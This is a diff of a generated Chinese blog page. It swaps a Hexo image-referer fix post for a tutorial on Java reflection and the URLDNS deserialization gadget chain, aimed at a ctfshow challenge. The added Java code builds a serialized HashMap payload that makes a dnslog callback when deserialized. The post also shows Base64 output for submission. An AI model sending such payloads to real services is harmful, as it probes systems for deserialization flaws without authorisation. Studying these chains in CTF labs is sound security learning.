@@ -173,10 +173,10 @@
         <div class="fleet-body flex-col w-full">
             <div class="fleet-header">
                 <div class="fleet-content-header-title text-6xl">
-                    <h1 class="inline-block font-extrabold mt-16 mb-8">使用Python脚本修改语雀导文件图片格式(二)</h1>
+                    <h1 class="inline-block font-extrabold mt-16 mb-8">Java反序列化之反射和URLDNS</h1>
                 </div>
                 <div class="fleet-content-header-info">
-                    <span>2023/07/14 22:14:56</span>
+                    <span>2024/01/22 18:38:09</span>
                 </div>
             </div>
             <div class="divider w-full"></div>
@@ -190,15 +190,192 @@
                         <!--图片-->
                         
                         <article class="prose">
-                            <p>如果你用了我之前发的脚本，你就会发现这个图片删后缀解析功能失效了。<br>不仅如此，以前用过生成的所有图片也失效了。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341771143-c9ff93d6-105e-4b66-843b-6a71055630dc.png" alt="image.png"><br>如果预览的话，会提示如下：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341553395-02439fe9-4d5d-4472-addd-b145a50c68a5.png" alt="image.png"><br>但是当多次访问之后就会提示下载，但是图片仍然不会解析。<br>本来以为用不了了，打算搞个接口自己刷新，但是教程太乱了，而且感觉应该还有绕过的办法。<br>经过多次调试发现，这里有一个referer验证。<br>没有referer的访问是会被403的。<br>因此这个问题就变成了如何让访问具有referer验证，或者说不让他验证。<br>在网上查了很久发现一段代码：</p>
-<pre class="language-python" data-language="python"><code class="language-python">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</code></pre>
-<p>用它来拒绝referer的请求。原文提示说，需要放在主题文件下的post.ejs文件。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341855216-ca39347e-3323-48e1-8f30-3c30a27f6efd.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341886707-ad13d3bd-e38d-4ca6-8f99-950d29a7933b.png" alt="image.png"><br>如果到这里，你的博客正好有<code>.ejs</code>文件。那就少了很多折腾。<br>以我的为例（butterfly）这个主题文件下的内容全是以<code>.pug</code>格式为后缀，<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689341987132-603e1d10-1028-495d-b11c-7f6ff6dc77fd.png" alt="image.png"><br>因此，原封不动照抄是会一片红的。<img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342102855-d9c2abd5-2686-4a18-b042-81261ab1a39a.png" alt="image.png"><br>研究了挺长时间，找了找语法，得到了一种修改办法。</p>
-<pre class="language-python" data-language="python"><code class="language-python">meta(name&#x3D;&quot;referrer&quot;, content&#x3D;&quot;no-referrer&quot;)</code></pre>
-<p>将其修改成对应语法，并且塞到某一个位置。注意，这行代码在不同位置，可能会导致你的博客排版错误。<br>我放在了<code>themes\butterfly\layout</code>下的post.pug，并置于：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342167433-b44c1209-5565-4bdd-9140-991addb4bdeb.png" alt="image.png"><br>再说一遍，这行代码在不同位置，可能会导致你的博客排版错误。这里是我试过不会排版错误，而且能重新拉取到图片的地方。<br>保存之后，运行以下命令：</p>
-<pre class="language-python" data-language="python"><code class="language-python">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</code></pre>
-<p>查看本地；拉取效果。<br>如果重新出现图片，就说明拉取成功了，deploy到远端即可。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689342465833-28799703-6b56-49d7-af39-bd43bd76e6ce.png" alt="image.png"></p>
-<h2 id="已经有了更好的办法"><a href="#已经有了更好的办法" class="headerlink" title="已经有了更好的办法"></a>已经有了更好的办法</h2><p>之前按这样改，会出现进入页面还是损坏图片，但是点击获取一下，再刷新页面就会正常获取图片。<br>思考了一下，这不就说明引用条件太晚了，图片已经被请求过了。<br>那我就有个想法，直接改到引用比较靠前的文件中去，比如说：<br><code>\themes\butterfly\layout\includes</code>文件夹下的<code>layout.pug</code>在这个文件中写。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689343646123-2d3213ae-5535-4e76-b193-2df07d9aa8b4.png" alt="image.png"><br>保存刷新一下，发现已经可用了。进入加载页面就可以显示图片了。</p>
-<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>如果修改之后还没显示，清除cookie刷新一下试试，如果还不行，那就只能自己再想办法了。改过好几个了，应该还能挺一段时间。</p>
+                            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习视频从这里开始看：</p>
+<ul>
+<li>第一部分：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&p=2">https://www.bilibili.com/video/BV16h411z7o9?t=1105.7&p=2</a></li>
+<li>第二部分：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV16h411z7o9?t=1180.1">https://www.bilibili.com/video/BV16h411z7o9?t=1180.1</a></li>
+</ul>
+<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><p>这里有几个快捷键，可以记忆一下。<br>比如说查看结构：<code>alt</code>+<code>7</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911881513-def44fe6-1290-402e-ac72-e5d469dc27b3.png" alt="image.png"><br>查看层次结构：<code>ctrl</code> + <code>H</code><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705911911141-796d9fcd-ccf9-4b57-8857-99b0c8bbfebf.png" alt="image.png"></p>
+<h1 id="URLDNS-链子构建"><a href="#URLDNS-链子构建" class="headerlink" title="URLDNS 链子构建"></a>URLDNS 链子构建</h1><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>URL有继承Serializable就证明他是可以被序列化的：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912047710-4b30948a-d2c6-494a-b1ad-21456f7223ce.png" alt="image.png"><br>而且需要使用一个较为常见的函数hashCode：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912179145-ba171de9-9986-41de-bff3-dd8b6bf833c2.png" alt="image.png"><br>调用了handler的hashCode函数，<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705912277976-1cccbd4c-039a-4cd2-9c20-593fb3f00bad.png" alt="image.png"><br>其中的getHostAddress就会对域名进行解析，然后就可以利用。<br>dnslog生成一个网址来测试。</p>
+<pre class="language-java" data-language="java"><code class="language-java">import java.io.*;
+import java.net.URL;
+import java.util.HashMap;
+
+public class URLDNS &#123;
+
+    static String tarURL &#x3D; &quot;http:&#x2F;&#x2F;qdgj5w.dnslog.cn&quot;;
+
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+        HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();
+        URL url &#x3D; new URL(tarURL);
+        hashMap.put(url, 1);
+        serialize(hashMap);
+    &#125;
+&#125;
+</code></pre>
+<p>正常来说当运行 main 函数时不会访问URL，但实际上运行的结果是会访问URL的。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913035776-ba8b7b09-5761-4a22-ad4c-b150a34bc108.png" alt="image.png"><br>为什么呢，因为HashMap的put方法中就已经调用了hashCode函数：</p>
+<pre class="language-java" data-language="java"><code class="language-java">public V put(K key, V value) &#123;
+        return putVal(hash(key), key, value, false, true);
+&#125;</code></pre>
+<p>其中的hash()：</p>
+<pre class="language-java" data-language="java"><code class="language-java">static final int hash(Object key) &#123;
+        int h;
+        return (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);
+    &#125;</code></pre>
+<p>hashCode会被初始化设定为-1.<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913461604-8214e6ce-89b4-45b9-8904-d4fd859ae638.png" alt="image.png"><br>如果在put方法中执行一次，导致其不再是-1，就无法进入后面的handler的hashCode。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705913412666-b77e9157-9983-4d30-a486-139748902adc.png" alt="image.png"><br>这就会导致不执行handler的hashCode。<br>也就是：</p>
+<pre class="language-java" data-language="java"><code class="language-java">设定 hashCode &#x3D; -1
+↓
+hashmap.put(url, 1);
+↓
+hashcode &#x3D; url的hashCode</code></pre>
+<p>无法在serialize中触发。<br>我们可以测试一下在发序列化中是否触发：</p>
+<pre class="language-java" data-language="java"><code class="language-java">class Deserialize &#123;
+    static String filename &#x3D; &quot;ser.bin&quot;;
+    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));
+        Object obj &#x3D; objectInputStream.readObject();
+        return obj;
+    &#125;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        deserialize(filename);
+    &#125;
+&#125;</code></pre>
+<p>运行之后并没有收到请求。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705914084629-ec29f1ac-515a-482d-8d34-a5f827f99fd7.png" alt="image.png"><br>也就是说我们目前的问题就变成了：</p>
+<pre class="language-java" data-language="java"><code class="language-java">HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();
+        &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求
+        URL url &#x3D; new URL(tarURL);
+        hashMap.put(url, 1);
+        &#x2F;&#x2F; * 在这里将hashCode改回-1
+        serialize(hashMap);</code></pre>
+<p>其中这里将hashCode改回1就用到了反射，那反射是什么呢？</p>
+<h2 id="正射和反射"><a href="#正射和反射" class="headerlink" title="正射和反射"></a>正射和反射</h2><p>要想知道什么是反射，那就要先了解什么是正射：</p>
+<pre class="language-java" data-language="java"><code class="language-java">Player boogipop &#x3D; new Player();
+boogipop.playGame(&quot;GENSHIN&quot;);</code></pre>
+<p>也就是先实例化对象，然后对对象进行操作。<br>而反射与正射不同，比如你并不知道原来所实例化的对象是什么。</p>
+<pre class="language-java" data-language="java"><code class="language-java">Class class1 &#x3D; boogipop.getClass();
+Method method1 &#x3D; class1.getMethod(&quot;playGame&quot;, String.class);
+Constructor constructor &#x3D; class1.getConstructor();
+Object object &#x3D; constructor.newInstance();
+method1.invoke(object, &quot;GENSHIN&quot;);</code></pre>
+<p>示例代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">class ReflectionTest &#123;
+    public static void main(String[] args) &#123;
+        Person person &#x3D; new Person();
+        Class c &#x3D; person.getClass();
+        &#x2F;&#x2F; * 反射就是对Class进行操作
+        &#x2F;&#x2F; * 从抽象类Class中实例化对象
+        &#x2F;&#x2F; c.newInstance();
+        &#x2F;&#x2F; * 获取构造器 比如需要传入什么参数
+        Constructor constructor &#x3D; c.getConstructor(String.class, int.class);
+        &#x2F;&#x2F; * 传入参数，生成对象
+        Person person &#x3D; (Person) constructor.newInstance(&quot;Boogipop&quot;, 6);
+        System.out.println(person);
+        &#x2F;&#x2F; * 获取参数
+        Field[] personFields &#x3D; c.getFields();
+        &#x2F;&#x2F; * 获取所有参数 包括private protected等
+        Field[] personFields1 &#x3D; c.getDeclaredFields();
+        for (Field f:personFields)&#123;
+            System.out.println(f);
+        &#125;
+        &#x2F;&#x2F; * 根据变量名获取
+        Field nameField &#x3D; c.getField(&quot;name&quot;);
+        &#x2F;&#x2F; * 允许访问
+        nameField.setAccessible(true);
+        nameField.set(person, &quot;Berial&quot;);
+        System.out.println(person);
+        &#x2F;&#x2F; * 调用方法
+        Method[] method &#x3D; c.getMethods();
+        for (Method method1:method)&#123;
+            System.out.println(method1);
+        &#125;
+        &#x2F;&#x2F; * 获取方法
+        Method actionMethod &#x3D; c.getMethod(&quot;playGame&quot;, String.class);
+        &#x2F;&#x2F; * 执行方法
+        actionMethod.invoke(person, &quot;GENSHIN&quot;);
+    &#125;
+&#125;</code></pre>
+<h2 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h2><p>知道了反射，就可以使用反射修改其中的hashCode。<br>也就是这样：</p>
+<pre class="language-java" data-language="java"><code class="language-java">public static void main(String[] args) throws Exception&#123;
+    HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();
+    &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求
+    &#x2F;&#x2F; * 如果hashCode已经是-1了就不会发起请求
+    URL url &#x3D; new URL(tarURL);
+    Class c &#x3D; url.getClass();
+    Field hashCode &#x3D; c.getDeclaredField(&quot;hashCode&quot;);
+    hashCode.setAccessible(true);
+    &#x2F;&#x2F; 随便赋值一个不是-1就行
+    hashCode.set(url, 1);
+    hashMap.put(url, 1);
+    &#x2F;&#x2F; * 在这里将hashCode改回-1
+    hashCode.set(url, -1);
+    serialize(hashMap);
+&#125;</code></pre>
+<p>在反序列化之后我们才收到请求：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705918481578-104f0ce8-3145-4649-9786-3f06e25186dc.png" alt="image.png"><br>完整代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">import java.io.*;
+import java.lang.reflect.*;
+import java.net.URL;
+import java.util.Base64;
+import java.util.HashMap;
+
+public class URLDNS &#123;
+    &#x2F;&#x2F; * 记得去掉后面的&#x2F;
+    static String tarURL &#x3D; &quot;http:&#x2F;&#x2F;test&quot;;
+
+    public static void serialize(Object obj) throws IOException&#123;
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        objectOutputStream.writeObject(obj);
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+        HashMap&lt;URL, Integer&gt; hashMap &#x3D; new HashMap&lt;URL, Integer&gt;();
+        &#x2F;&#x2F; * 正常使用这个会导致开始的时候访问一次，让这里不要发起请求
+        &#x2F;&#x2F; * 如果hashCode已经是-1了就不会发起请求
+        URL url &#x3D; new URL(tarURL);
+        Class c &#x3D; url.getClass();
+        Field hashCode &#x3D; c.getDeclaredField(&quot;hashCode&quot;);
+        hashCode.setAccessible(true);
+        &#x2F;&#x2F; 随便赋值一个不是-1就行
+        hashCode.set(url, 1);
+        hashMap.put(url, 1);
+        &#x2F;&#x2F; * 在这里将hashCode改回-1
+        hashCode.set(url, -1);
+        serialize(hashMap);
+    &#125;
+&#125;
+
+class Deserialize &#123;
+    static String filename &#x3D; &quot;ser.bin&quot;;
+    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
+        ObjectInputStream objectInputStream &#x3D; new ObjectInputStream(new FileInputStream(filename));
+        Object obj &#x3D; objectInputStream.readObject();
+        return obj;
+    &#125;
+
+    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;
+        deserialize(filename);
+    &#125;
+&#125;
+
+</code></pre>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><blockquote>
+<p>ctfshow web846</p>
+</blockquote>
+<p><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919075679-2e31b01d-31d4-4658-88c8-7ec122a03666.png" alt="image.png"><br>修改serialize代码：</p>
+<pre class="language-java" data-language="java"><code class="language-java">public static void serialize(Object obj) throws IOException&#123;
+        ByteArrayOutputStream byteArrayOutputStream &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream &#x3D; new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.flush();
+        objectOutputStream.close();
+        System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
+    &#125;</code></pre>
+<p>来方便查看输出的内容。<br>post传入输出的内容即可：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2024/png/34866087/1705919699691-9b7f04cb-a231-41c6-b870-4e7ea3731298.png" alt="image.png"></p>
 
                         </article>
                     </div>
@@ -209,7 +386,7 @@
                         <div class="flex-row flex w-full justify-between">
                             <div class="fleet-content-body-footer-left">
                                 
-                                    <div><a href="/posts/d6dc50dc/"
+                                    <div><a href="/posts/ac1fd128/"
                                             class="btn btn-sm md:btn-md gap-2 lg:gap-3">
                                             <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                  xmlns="http://www.w3.org/2000/svg"
@@ -218,17 +395,17 @@
                                             </svg>
                                             <div class="flex flex-col items-start"><span
                                                         class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
-                                                <span>web214-web253SQL注入篇（三）</span></div>
+                                                <span>Java反序列化之CC1</span></div>
                                         </a></div>
                                 
                             </div>
                             <div class="fleet-content-body-footer-right">
                                 
-                                    <div><a href="/posts/84a9ce9a/"
+                                    <div><a href="/posts/f5628547/"
                                             class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
                                             <div class="flex flex-col items-end"><span
                                                         class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
-                                                <span>web191-web213SQL注入篇（二）</span></div>
+                                                <span>web373-web378XXE篇</span></div>
                                             <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
                                                  xmlns="http://www.w3.org/2000/svg"
                                                  width="24" height="24" viewBox="0 0 24 24">
